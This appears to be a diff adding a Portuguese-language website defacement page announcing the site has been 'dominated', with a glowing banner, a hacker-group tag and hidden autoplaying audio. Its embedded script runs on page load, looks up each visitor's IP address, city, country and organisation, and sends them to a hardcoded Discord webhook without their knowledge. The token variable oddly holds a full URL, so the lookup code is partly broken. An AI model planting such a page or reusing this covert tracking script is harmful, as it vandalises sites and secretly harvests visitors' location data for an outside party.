@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>HACKED</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    .main-msg {
+      color: red;
+      font-size: 48px;
+      font-weight: bold;
+      margin-top: 20px;
+      animation: glow 1s ease-in-out infinite alternate;
+    }
+
+    .sub-msg {
+      color: white;
+      font-size: 16px;
+      margin-top: 10px;
+      animation: glow 1.5s ease-in-out infinite alternate;
+    }
+
+    @keyframes glow {
+      from {
+        text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+      }
+      to {
+        text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000;
+      }
+    }
+
+    img {
+      margin-top: 20px;
+      width: 300px;
+      border-radius: 10px;
+    }
+
+    .gif {
+      margin-top: 20px;
+    }
+
+    audio {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="main-msg">VOCÊ FOI DOMINADO</div>
+  <div class="sub-msg">#ЦИКИА — Ninguém está seguro</div>
+
+  <img src="deface cci.jpg" alt="Deface CCI">
+
+  <div class="gif">
+    <img src="https://media.tenor.com/GsMShfRYo08AAAAd/eye-dark-eye.gif" alt="Olho escuro">
+  </div>
+
+  <audio autoplay loop>
+    <source src="video daface.mp4" type="audio/mp4">
+    Seu navegador não suporta áudio embutido.
+  </audio>
+
+  <!-- Script para capturar IP e enviar via webhook -->
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1385061151402102936/mpZy6kGaSw2h54FQ5dNCDwciTWkBbJTquno_CPtkXMJNv2AbMnfGuXx95h-CweqK_9tY"; // 🔁 Substitua pelo seu webhook real
+    const token = "https://api.ipinfo.io/lite/8.8.8.8?token=1d52fe0c2e72d5"; // 🔁 Substitua pelo seu token do ipinfo.io
+
+    fetch(`https://ipinfo.io/json?token=${token}`)
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip || "Desconhecido";
+        const cidade = data.city || "Desconhecido";
+        const pais = data.country || "Desconhecido";
+        const org = data.org || "Desconhecida";
+
+        const payload = {
+          content: `📡 IP detectado:\n🌍 IP: ${ip}\n🏙️ Cidade: ${cidade}\n🇧🇷 País: ${pais}\n🏢 Org: ${org}`
+        };
+
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+      })
+      .catch(error => {
+        console.error("Erro ao capturar o IP:", error);
+      });
+  </script>
+</body>
+</html>
